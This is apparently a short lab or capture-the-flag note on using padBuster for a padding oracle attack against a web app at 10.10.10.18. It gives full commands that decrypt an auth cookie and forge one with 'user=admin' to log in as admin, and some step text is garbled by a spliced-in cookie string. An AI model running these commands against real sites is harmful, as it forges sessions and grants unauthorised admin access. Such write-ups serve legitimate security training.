## padbuster

```
Automated script for performing Padding Oracle attacks
```

1.  get a sample of encrypted data

![image-20200920214646458](padbuster.assets/image-20200920214646458.png)



2. provide the sample to padt3ys%2FoQAWpJHYkinmbDc1%2FT0F -cookies auth=GoAmEM1t3ys%2FoQAWpJHYkinmbDc1%2FT0F 8Buster

```
perl padBuster.pl http://10.10.10.18/ GoAmEM1t3ys%2FoQAWpJHYkinmbDc1%2FT0F -cookies auth=GoAmEM1t3ys%2FoQAWpJHYkinmbDc1%2FT0F 8
```

![image-20200920214803810](padbuster.assets/image-20200920214803810.png)



3. it will take some time to decrypt.

![image-20200920215336076](padbuster.assets/image-20200920215336076.png)



4. auth=we also perform reverse attack that is encrypting something to this encryption

```
perl padBuster.pl http://10.10.10.18/ GoAmEM1t3ys%2FoQAWpJHYkinmbDc1%2FT0F -cookies auth=GoAmEM1t3ys%2FoQAWpJHYkinmbDc1%2FT0F 8 --plaintext user=admin
```

![image-20200920220602474](padbuster.assets/image-20200920220602474.png)



5. set the cookie and we logged in as admin

![image-20200920220719949](padbuster.assets/image-20200920220719949.png)